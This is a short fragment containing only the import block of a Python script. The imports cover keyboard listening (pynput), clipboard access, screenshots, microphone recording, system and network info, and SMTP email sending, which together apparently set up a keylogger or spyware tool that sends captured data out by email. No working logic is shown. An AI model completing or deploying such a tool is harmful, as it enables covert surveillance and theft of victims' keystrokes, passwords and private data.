# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import sounddevice as sd
from scipy.io.wavfile import write
import win32clipboard
import pyscreenshot as ImageGrab
from pynput.keyboard import Key, Listener
import time
import os
